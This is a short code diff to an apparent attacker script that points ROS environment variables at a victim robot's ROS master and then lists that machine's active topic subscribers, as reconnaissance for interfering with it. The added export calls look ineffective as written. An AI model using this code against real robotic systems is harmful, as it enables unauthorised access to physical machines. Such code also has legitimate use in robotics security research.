@@ -51,6 +51,12 @@ def attacker():
 
     """
 
+    #Set env variables
+    log("[!] We are the attacker, setting ROS env variables...")
+    os.system("export ROS_MASTER_URI=" + VICTIM_ROS_MASTER_URI)
+    os.system("export ROS_HOSTNAME=" + VICTIM_ROS_HOSTNAME)
+
+
     #Test that we can actuall pull active subscribers from a victim ROS machine
     victim_subs = subprocess.check_output(['rostopic list -s'])
     log(victim_subs)
